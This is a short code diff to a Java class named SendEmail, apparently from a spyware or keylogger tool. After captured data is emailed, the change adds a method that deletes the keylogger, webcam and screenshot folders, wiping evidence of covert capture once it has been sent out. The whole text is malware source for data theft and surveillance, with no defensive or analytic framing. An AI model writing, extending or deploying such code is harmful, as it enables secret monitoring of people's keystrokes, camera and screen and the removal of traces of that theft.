@@ -71,10 +71,17 @@ public class SendEmail {
             email.send();
             System.out.println("Success send it !");
 
-            Utils.deleteFolderContent(new File(Settings.savePath + Settings.APP_NAME));
+            cleanFoldersAfterSend();
         } catch (EmailException e) {
             System.out.println("Error sending !");
             e.printStackTrace();
         }
     }
+
+    private void cleanFoldersAfterSend() {
+        Utils.deleteFolderContent(new File(Settings.KEYLOGGER_PATH));
+        Utils.deleteFolderContent(new File(Settings.WEBCAM_PATH));
+        Utils.deleteFolderContent(new File(Settings.SCREENSHOT_PATH));
+    }
+
 }
